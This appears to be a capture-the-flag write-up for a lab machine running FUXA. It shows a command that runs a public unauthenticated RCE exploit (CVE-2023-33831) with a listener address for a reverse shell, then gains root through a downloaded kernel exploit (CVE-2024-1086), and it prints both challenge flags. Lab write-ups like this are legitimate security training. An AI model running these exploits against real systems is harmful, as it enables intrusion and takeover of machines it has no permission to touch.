### Challenge Description

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/67f3d1ea-2d8c-4121-b230-dd6fb66f75ba)

## Enumeration

A static looking page is shown but a link in an article hides the way forward:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/0c747a05-2acb-4037-9d75-a4c394788ecf)

It redirects us to a subdomain that we didn't find by fuzzing:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/168511f2-ef0a-42c4-b25d-d3d5883ba68f)

A quick google search showed that it has an RCE vulnerability:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/fa7799d3-9ca6-487a-b110-010411c102a2)


## Foothold

We download and run the [exploit](https://github.com/rodolfomarianocy/Unauthenticated-RCE-FUXA-CVE-2023-33831):  

`python3 fuxaexploit.py --rhost fuxa.survivor.htb --rport 80 --lhost 10.10.14.34 --lport 3001`

Sure enough, we get a foothold and the user flag:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/bc1486d0-9e5a-4b7e-803f-20ac75e94830)

`HTB{FuXa_ExPloIT_4_RC3}`

## Privesc

After a bit of manual enumeration, linpeas scanning and pspy observations, I didn't see anything sticking out to me as an obvious privilege escalation vector. When that happens, I usually look for kernel exploits and remembered that there is a recent 2024 [CVE](https://github.com/Notselwyn/CVE-2024-1086?tab=readme-ov-file)

I downloaded the precompiled binary and ran it to get root and the flag:  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/47408665-3875-44a2-be85-05661f9096e0)

`HTB{KeRnEnL_ExP_4_r00t}`
